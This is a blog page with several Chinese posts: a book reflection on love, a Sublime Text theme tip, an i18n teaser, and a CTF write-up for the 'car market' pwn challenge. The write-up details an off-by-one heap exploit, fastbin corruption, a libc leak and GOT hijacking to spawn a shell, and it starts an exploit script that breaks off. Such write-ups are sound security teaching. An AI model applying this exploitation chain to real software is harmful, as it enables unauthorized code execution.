<p>我小的时候对于爱的解释，印象中的故事竟然都是来自是电影：一部是 <a target="_blank" rel="noopener" href="http://baike.baidu.com/item/%E6%B3%B0%E5%9D%A6%E5%B0%BC%E5%85%8B%E5%8F%B7/6162581">《泰坦尼克号》</a>，另一部是 <a target="_blank" rel="noopener" href="http://baike.baidu.com/item/%E7%9C%9F%E7%88%B1%E8%87%B3%E4%B8%8A/1671898">《真爱至上》</a>。《泰坦尼克号》的男主 Jack 为了心爱的人，放弃自己生存的机会，让我以为爱是一种牺牲。而在大学时看的《真爱至上》，电影中的 10 个故事，讲了各种各样爱的故事，有小朋友之间的爱，有情侣之间的爱，更有同性之间的爱。电影最后的一句台词给爱下了一个更广泛的定义：「Love actually is everthing.」，</p>
<p>我现在 30 多岁了，结婚了，也有了小孩，有些时候我觉得爱就一种亲情，但是又说不清楚。因为家庭生活中其实会有各种琐事，各种争吵，有些时候也会困惑，不知该如何处理。</p>
<p>还是要感谢李笑来老师，他推荐的这本 <a target="_blank" rel="noopener" href="http://item.jd.com/11323419.html">《少有人走的路》</a>，用更详尽的篇章，从一个学术的角度讨论了什么是爱。这本书的作者斯科特·派克是一个心理医生，在书中的第二部分，作者详尽分析了各种关于爱的行为，告诉我们什么样的行为是爱，什么样的行为不是爱。</p>
<h2 id="爱的定义"><a href="#爱的定义" class="headerlink" title="爱的定义"></a>爱的定义</h2><p>作者从他的角度，给爱下了如下的定义：</p>
<blockquote>
<p>爱，是为了促进自我和他人心智成熟，而具有的一种自我完善的意愿。</p>
</blockquote>
<p>这个定义非常有意思，完全不同于我们以前了解到的爱的描述，我们从中可以看到两个特征：</p>
<ol>
<li>爱可以使双方都获得心智成熟。这就像是杨过和小龙女的「双修」一样，是一种共同进步的互利行为。</li>
<li>爱是一种自我完善的意愿。我们都希望通过它获得心智的成熟，人格的独立。</li>
</ol>
<h2 id="爱的误解"><a href="#爱的误解" class="headerlink" title="爱的误解"></a>爱的误解</h2><p>弄清楚什么是爱是很难的，但是反过来，弄清楚什么不是爱相对来说容易一些，所以本书中分析了四种常见的错误的「爱」，分别是：坠入情网、依赖性、自我牺牲、（仅有）感觉。</p>
<h3 id="坠入情网"><a href="#坠入情网" class="headerlink" title="坠入情网"></a>坠入情网</h3><p>坠入情网不是爱。这可能是最常见的误区吧。年轻时的我们，由于荷尔蒙的分泌，对异性产生好感，进一步渴望和异性交往，然后坠入情网，最终啪啪啪以及结婚生子。作者认为坠入情网不是爱的核心理由是：坠入情网的 “爱” 不会持续太久，不管爱的对象是谁，早晚我们都会从情网的羁绊中 “爬出”。有一个词叫「七年之痒」，其实也是说这个道理。坠入情网这种爱更像是一种冲动和激情，随着时间会慢慢消退。</p>
<p>刚刚说到爱需要使双方心智变得成熟。但是坠入情网，惟一的好处就是消除寂寞。即便经由婚姻，使这一功用得以延长，也无助于心智的成熟。</p>
<p>悲观一点说，坠入情网其实是一种受人类本能控制的，来自我们 DNA 中繁衍需求的刺激。它的意义在于增加人类生殖机会，促进物种繁衍和生存。但是坠入情网其实是产生真正的爱的一个很好的媒介，后面我们再详细讨论。</p>
<h3 id="依赖性"><a href="#依赖性" class="headerlink" title="依赖性"></a>依赖性</h3><p>依赖性不是爱。我们会见到各种依赖性的行为，比如小孩对父母的依赖，妻子对丈夫的依赖，甚至父母对小孩也有依赖。一些小孩长大之后离开家门，父母会特别难受，但都会调整接受。如果一个父母因为对小孩有依赖，阻止孩子去外地上学或者工作，那么这种依赖性就不是爱了，因为它其实对孩子的发展并不有利。</p>
<p>反过来，父母的这种行为对于自己也是不利的，因为这也体现出他们的人格并不独立。总有一天，孩子还是会追求自由与不受控制，到时候父母也容易产生心理问题。</p>
<p>所以，过度的依赖行为其实使孩子和父母都丧失了人格的独立性，是不利于心智发展的，所以不是爱。</p>
<h3 id="自我牺牲"><a href="#自我牺牲" class="headerlink" title="自我牺牲"></a>自我牺牲</h3><p>自我牺牲不是爱。我们常常见到这样的行为：爷爷奶奶给孙子孙女买特别多的玩具，什么事情都惯着孩子，为了满足孩子的各种需求，甚至会牺牲一些自己的东西，例如金钱，健康，时间。这些牺牲如果是利于孩子身心发展的，那就是爱；如果最终使得孩子产生很坏的生活习惯和沟通方式，那么不但不是爱，还是一种伤害。</p>
<p>所以，自我牺牲的付出不一定是爱，还得看付出之后的效果是怎样的。</p>
<h3 id="感觉"><a href="#感觉" class="headerlink" title="感觉"></a>感觉</h3><p>爱，不是感觉。爱是一种行为，而不是一种感觉。如果你整天只是把爱挂在嘴上，但是并没有任何行为付出，那么其实这就不是爱。作者在书中指出，一些家庭的父母并不关心孩子的身心，只知道通过简单粗暴的方式来教育孩子，嘴上说是爱孩子，其实根本就没有付出真正上的行为。</p>
<p>作为父母，把孩子喂饱，提供教育相关的资金支持，仅仅是尽到了最基本的义务。而和孩子一起玩耍，交流，解决孩子的困难，纠正孩子的错误，关注和帮助孩子成长，才是更重要的行为。</p>
<h2 id="如何爱"><a href="#如何爱" class="headerlink" title="如何爱"></a>如何爱</h2><p>那么，我们应该如何去爱呢？作者介绍了一些原则：</p>
<ol>
<li>首先，爱与不爱最显著的区别之一，在于当事人的意识思维和潜意识思维的目标是否一致。</li>
<li>第二，爱是长期的和渐进的过程。爱是自我完善，意味着心智不断成熟。爱，能够帮助他人进步，也会使自我更加成熟。</li>
<li>第三，真正意义上的爱，既是爱自己，也是爱他人。爱，可以使自我和他人感觉到进步。不爱自己的人，绝不可能去爱他人。</li>
<li>第四，爱是自我完善，也是帮助他人完善。它意味着持续努力，超越自我界限。</li>
</ol>
<p>在以上原则下，作者提供了一些实践的办法：</p>
<ol>
<li>关注：爱最重要的体现形式，就是关注。体现关注，一种最常见、最重要的方式，就是 “倾听”。</li>
<li>自律：自律，是将爱转化为实际行动的过程。这里面涉及情绪的控制，我们既不能过于放纵情绪，也不能过于压抑情绪。</li>
<li>独立：爱的重要特征之一，在于爱者与被爱者都不是对方的附属品。付出真爱的人，应该永远把爱的对象视为独立的个体，永远尊重对方的独立和成长。</li>
</ol>
<p>最终，如果我们这么做，就会产生精神贯注的现象：</p>
<blockquote>
<p>真正的爱，是自我完善的特殊体验，跟自我界限有着密切关联。陶醉在爱的情感里，我们感觉灵魂无限延伸，奔向心爱的对象。我们渴望给对方滋养，我们希望对方成长。被自我界限之外的对象吸引，迫使我们产生冲动，想把激情乃至生命献给对方，心理学家把这样的激情状态，称为 “精神贯注”。我们贯注的对象，正是所爱的人或所爱的事物。</p>
</blockquote>
<h2 id="爱的风险"><a href="#爱的风险" class="headerlink" title="爱的风险"></a>爱的风险</h2><p>即便我们做到了真正的爱，但是也会面临一些风险：</p>
<ol>
<li>死亡的风险：精神贯注的代价之一，似乎是或早或晚你都要因为贯注对象的死亡或离去，让自己饱受痛苦的折磨。如果不想经受个中痛苦，就必须放弃生活中许多事物，包括子女、婚姻、性爱、晋升、友谊，但惟有这些事物，才能够使人生丰富多彩。</li>
<li>独立的风险：我们必须不再完全依赖任何人，成为一个人格独立的个体。</li>
<li>承诺的风险：我们需要具有责任感，承诺与爱相关的义务。</li>
<li>冲突的风险：我们需要面临与所爱的人的冲突，并且在冲突发生时，以帮助对方心智成熟作为出发点，来解决冲突。只有以爱为出发点，投入全部的情感，做出真挚的承诺，才能更好地滋养对方的心灵。例如，父母和孩子发生冲突时，首先应该自我检讨，认清自己的价值观，才能采取正确的方式，才能恰当地教育孩子。</li>
</ol>
<p>关于死亡的风险我深有感触。我现在 30 岁了，整个身体都不像 20 多岁那样有活力了，加班太晚会感觉特别累。我相信有一天，我会发现自己真的老了，不光精力大不如从前，可能视力，听力都退化了，那个时候我需要放弃很多年轻时获得的成就，但是这就是人生，所有人都逃避不了死亡。</p>
<p>关于冲突，我也有一些体会。我有时候在家里会抱怨一些事情，后来我发现，这除了让我和家人产生矛盾以外，完全无助于解决任何问题。所以我开始反思我是否应该用更加有效的方式来和家人沟通，试过几次之后，我发现家人也这些事情也有自己的看法。在冲突发生时，用诚实和谦逊的态度先自我反省，再进一步沟通，最终大家会学会到更好的相处方式。这确实也让我的心智更加成熟了，对情绪的控制（自律能力）更强了。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><a target="_blank" rel="noopener" href="http://item.jd.com/11323419.html">《少有人走的路》</a> 让我对爱有了更客观的认识，一句话总结：爱就是一种精神贯注的行为，它可以使自己和对方的心智都成长起来，从而获得健全的人格。</p>
<p>但是作者也坦诚地说，这样的定义还是无法解释很多爱的行为，不过对于我来说，已经学到很多了，推荐给大家。以下是本书第二部分的思维导图总结：</p>
<img src="/images/the-road-less-traveled-mindnode.jpg" class="">

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/15/2016/boxy-the-most-hackable-theme-fot-st3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/15/2016/boxy-the-most-hackable-theme-fot-st3/" itemprop="url">Sublime Text 3 主题推荐 —— Boxy</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-15T15:49:52+08:00">
                2016-09-15
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%97%A5%E5%B8%B8/" itemprop="url" rel="index">
                    <span itemprop="name">日常</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <p><img src="https://packagecontrol.io/readmes/img/e6c0cad6561d9317c095a0ab52e6fd890eebd842.gif" alt="BOXY"></p>
<p>用了好久的 Predawn，打算换个 Theme 和 Color Scheme 试试。在网上逛了一段时间后，我找到了一个很不错的 ST3 主题，这里分享一下：</p>
<blockquote>
<p>Boxy Theme</p>
<p>The most hackable theme for Sublime Text 3</p>
</blockquote>
<p>这个主题在 Package Control 上的页面在<a target="_blank" rel="noopener" href="https://packagecontrol.io/packages/Boxy%20Theme">这里</a>，这是一个非常强大的主题，你可以去看看它的介绍视频。</p>
<p>Boxy 提供了很多自定义选项，因此你甚至可以把 Sublime 打扮成 Atom、VS Code，甚至是同为 ST 主题的 Predawn&#x2F;Material 的样式，简直碉堡了好吗：</p>
<p><img src="https://img.prin.studio/legacy/image.php?di=VFYA" alt="Screenshot"></p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2016/09/15/2016/boxy-the-most-hackable-theme-fot-st3/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/15/2016/yet-another-solution-for-javascript-i18n/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/15/2016/yet-another-solution-for-javascript-i18n/" itemprop="url">又是一种用于 JavaScript 的前端国际化方案</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-15T12:04:31+08:00">
                2016-09-15
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index">
                    <span itemprop="name">技术</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <p>现在 Blessing Skin Server 的 HTML 模板是使用 Laravel 自带的本地化来实现多语言支持的，并且使用了 <a target="_blank" rel="noopener" href="https://github.com/Devitek/laravel-yaml-translation">devitek&#x2F;yaml-translation</a> 这个包把 Laravel 语言文件从默认的 PHP 数组形式改为 YAML 格式的文件。</p>
<p>不得不说数组形式的语言文件简直反人类好吗，一大堆 <code>=&gt;</code> 看的眼晕。。YAML 大法好！(ゝ∀･)</p>
<p>回到正题。虽然 HTML 模板里的国际化是解决了，但是整个应用中需要国际化的地方可不止 HTML 模板，同时还有 JavaScript。但是静态的脚本文件中总不能内嵌 PHP 吧，所以我们得搞个单独的解决方案。</p>
<p>虽然说网上现成的 JS 国际化的库很多，但我总觉得有些看不上眼（可能是我没找到好的），就准备自己实现一下。</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2016/09/15/2016/yet-another-solution-for-javascript-i18n/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/14/ASIS-CTF-Finals-2016-car-market-177/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/14/ASIS-CTF-Finals-2016-car-market-177/" itemprop="url">[ASIS CTF Finals 2016] car market 177</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-14T18:16:00+08:00">
                2016-09-14
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index">
                    <span itemprop="name">write-ups</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><blockquote>
<p>Category: pwn<br>Point: 177<br>Solver: bruce30262 @ BambooFox<br>再次感謝 Ann Tsai 提供機器並幫忙跑 exploit，以及 ddaa 幫忙讀 flag XD</p>
</blockquote>
<h2 id="Analyzing"><a href="#Analyzing" class="headerlink" title="Analyzing"></a>Analyzing</h2><p>64 bit ELF, 有 NX, stack guard, Partial RELRO, 沒 PIE</p>
<p>程式主要有三個選單。一開始進入第一個選單，我們可以 add car, remove car, list car 跟 select car。select car 之後進入第二個選單，可以選擇印出 car 的 info，設定 car 的資訊以及新增一個 customer。新增 customer 時會進入第三個選單，可以設定 customer 的名字和 comment。</p>
<p>程式主要有兩個 data structure，分別是 <code>car</code> 與 <code>customer</code>，structure 內容如下:</p>
<figure class="highlight c"><figcaption><span>car</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">car</span>&#123;</span></span><br><span class="line">  <span class="type">char</span> model[<span class="number">16</span>];</span><br><span class="line">  <span class="type">long</span> price;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">customer</span>* <span class="title">customer</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><figcaption><span>customer</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">customer</span>&#123;</span></span><br><span class="line">  <span class="type">char</span> first_name[<span class="number">32</span>];</span><br><span class="line">  <span class="type">char</span> name[<span class="number">32</span>];</span><br><span class="line">  <span class="type">char</span>* comment; <span class="comment">// buffer size: 0x48</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>透過一些 reversing 以及 fuzzing，我們可以整理出程式裡面一些較為重要的行為:  </p>
<ul>
<li>global data 段會有個 pointer <code>ptr</code>，型態為 <code>struct car**</code>。程式一開始會 malloc 一塊 buffer 給 <code>ptr</code>，之後會拿來存 <code>car*</code> 的 array。  </li>
<li>在新增一個 <code>car</code> 的 customer 的時候，程式會先檢查 <code>car-&gt;customer</code> 與 <code>car-&gt;customer-&gt;comment</code> 是否存在。如果存在的話會先對這兩塊記憶體做 free，之後重新 malloc 兩塊記憶體給這兩個 data，確保一個 <code>car</code> 裡面只會有一個 customer。  </li>
<li>程式在處理使用者輸入的時候有存在多個 <strong>off-by-one</strong> 的漏洞。如果在設定 <code>model</code>, <code>first_name</code> 以及 <code>name</code> 的時候，輸入一個較長的字串，我們就有辦法觸發這個漏洞，<strong>造成 structure 中的下一個 data 的第一個 byte 被蓋成 null byte。</strong></li>
</ul>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>首先我們要有辦法 leak 一些 address。</p>
<p>首先是 heap 的 address。這部分可以透過以下操作來拿到: </p>
<ul>
<li>新增 customer，進入選單三  </li>
<li>離開選單三</li>
<li>再進一次選單三</li>
<li>離開選單三並印出 customer 資訊，此時 <code>customer-&gt;first_name</code> 會是一個 heap 的 address</li>
</ul>
<p>會這樣是因為我們在第二次進入選單三的時候，程式會檢查到 <code>car-&gt;customer</code> 與 <code>car-&gt;customer-&gt;comment</code> 的存在，並且會嘗試去 free 這兩塊記憶體。此時 free 完之後，<code>customer</code> 這個 chunk 的 fd (<strong>也就是 <code>customer-&gt;first_name</code> 的位置</strong>) 會被寫成下一個 free chunk 的 address，因此如果這時我們印出 customer 的 first_name，就可以拿到 heap 的 address。</p>
<p>下一個是 libc 的 address。這部分我們可以利用前面提到的 off-by-one 漏洞，搭配 <strong>fastbin corruption</strong> 的方式來做到。方法如下:</p>
<p>假設我們有一個 <code>car</code>，它的 <code>customer</code> 的 memory layout 長的像這個樣子:</p>
<pre>
             +------------------+
customer     |........first_name| char first_name[32]
             |..................|
             |..................|
             |..................|
             +------------------+
customer+32  |..............name| char name[32]
             |..................|
             |..................|
             |..................|
             +------------------+
customer+64  |        0x12345680| char* comment
             +------------------+ 
</pre>

<p>此時如果我們再輸入一次 <code>name</code>，並給一個長度超過 32 的字串的話，我們就可以透過 off-by-one 的漏洞，**將 comment 的 pointer 從 <code>0x12345680</code> 改成 <code>0x12345600</code>**。之後程式在 free <code>car-&gt;customer-&gt;comment</code> 的時候，就會 free 到一個錯誤的 chunk。如果我們這時又有一個 <code>car</code>，它的 memory layout 長這樣:</p>
<pre>
                      +------------------+
    car    0x123455F0 |               0x0| char model[16]
                      +------------------+
                      |              0x51|
                      +------------------+
    car+16 0x12345600 |              0x64| long price
                      +------------------+
    car+24 0x12345608 |        0x12348880| struct customer* customer
                      +------------------+
</pre>

<p>此時我們可以透過設定 <code>car-&gt;model</code> 來偽造 <code>0x12345600</code> 這塊 memory chunk 的 header，讓程式誤以為它是在 free 一個 size 為 0x50 的 memory chunk (size &#x3D; 0x50，跟 <code>comment</code> 的大小一樣)，並將 <code>0x12345600</code> 這個 memory chunk 加入 fastbin 裡面。 這麼一來我們就製造了一個 <strong>Use-After-Free</strong> 的情形，其中 <code>0x12345600</code> 是我們的 dangling pointer。之後再新增一次 comment 的時候，程式會 malloc <code>0x12345600</code> 來當作是 comment 的 buffer。此時，comment 的 buffer 將會和某個 <code>car</code> 的 structure 重疊，之後我們就可以藉由更改 comment 來修改 <code>car</code> 的 structure。</p>
<p>可以改 <code>car</code> structure 之後，我們就可以將 <code>car-&gt;customer</code> 這個 pointer 改成 <code>atoi</code> 的 GOT。之後我們就可以藉由印出 <code>car-&gt;customer-&gt;first_name</code> 來 leak <code>atoi</code> 的 GOT，得到 libc 的 address。</p>
<p>因此整理一下 leak libc address 的方法:</p>
<ol>
<li>先新增幾個 <code>car</code>，讓其中一個 <code>car</code> 的 address 是以 <strong>0xf0</strong> 做為結尾 (ex. <code>0x123455f0</code>)，並在 <code>car-&gt;model</code> 裡面放上假的 chunk header</li>
<li>利用 off-by-one 漏洞更改某個 customer 的 comment 指標 (ex. <code>0x12345680</code> –&gt; <code>0x12345600</code>)</li>
<li>離開並重新進入選單三，讓程式可以去 free 更改後的 comment 指標</li>
<li>再新增一個 comment，此時新的 comment buffer 會和其中一個 <code>car</code> structure 重疊，因此我們可以藉由更改 comment 的方式來偽造 <code>car</code> structure，將 <code>car-&gt;customer</code> 改成 <code>atoi</code> 的 GOT</li>
<li>印出 <code>car-&gt;customer-&gt;first_name</code>，leak <code>atoi</code> 的 GOT，得到 libc 的 address</li>
</ol>
<p>拿到 libc 的 address 之後就可以計算 <code>system</code> 的位址 (這題有給 libc.so)。因為這題 GOT 可寫，所以可以嘗試將 <code>atoi</code> 的 GOT 改成 <code>system</code> 之後 hijack <code>atoi</code> 的 GOT。本來一開始我是想用前面的方式來直接改 <code>atoi</code> 的 GOT，因為此時 <code>car-&gt;customer</code> &#x3D; <code>atoi@got.plt</code>，因此我們可以藉由更改 <code>car-&gt;customer-&gt;first_name</code> 的方式來 overwrite GOT 的內容。</p>
<p>只是嘗試這樣做之後發現程式會 crash。原因是因為要進入選單三更改 first_name 時，程式會先嘗試去 free <code>car-&gt;customer</code>，此時因為這個位置是 <code>atoi</code> 的 GOT，因此 <code>free(atoi@got.plt)</code> 時會炸掉。<strong>此時，文章前面提到的 <code>ptr</code> 變數便派上用場了。</strong></p>
<p><code>ptr</code> 是一個指向 <code>car*</code> array 的 pointer。因為我們現在可以藉由更改 comment 的方式來控制 <code>car</code> 的 structure，因此如果我們將 <code>car-&gt;customer</code> 改成 <code>ptr</code>，之後程式在 <code>free(car-&gt;customer)</code> 的時候就會去 free <code>ptr</code>，<strong>我們就可以把整個 <code>car*</code> array 給 free 掉</strong>。之後新增 comment 的時候，glibc 會把 <code>ptr</code> 的 chunk 做分割，將其中的 0x50 做為新的 buffer 分配給新的 comment。此時透過更改 comment，我們就可以控制一部分的 <code>car*</code> array。之後將 <code>car</code> 指標改成 <code>atoi</code> 的 GOT，我們就可以藉由更改 <code>car-&gt;model</code> 的方式來覆寫 <code>atoi</code> GOT 的內容，達到 hijack GOT 的效果。</p>
<p>將上述方法整理一下:</p>
<ol>
<li>透過 comment 更改 <code>car</code> 的 structure，將 <code>car-&gt;customer</code> 改成 <code>ptr</code></li>
<li>離開並重新進入選單三，讓程式可以去 free 更改後的  <code>car-&gt;customer</code></li>
<li>新增一個 comment，此時新的 comment buffer 會和 <code>car*</code> array 重疊，我們可以藉由更改 comment 的方式來控制 <code>car*</code> array</li>
<li>將其中一個 car 指標改成 <code>atoi</code> 的 GOT，並藉由更改 <code>car-&gt;model</code> 的方式，將 <code>atoi</code> 的 GOT 改成 <code>system</code> 的 address，做 GOT hijacking</li>
</ol>
<p>之後我們在輸入選項時，就可以輸入 <code>sh\x00</code>，執行 <code>system(&#39;sh&#39;)</code> 拿 shell。</p>
<figure class="highlight python"><figcaption><span>exp_car.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;car-market.asis-ctf.ir&quot;</span></span><br><span class="line">PORT = 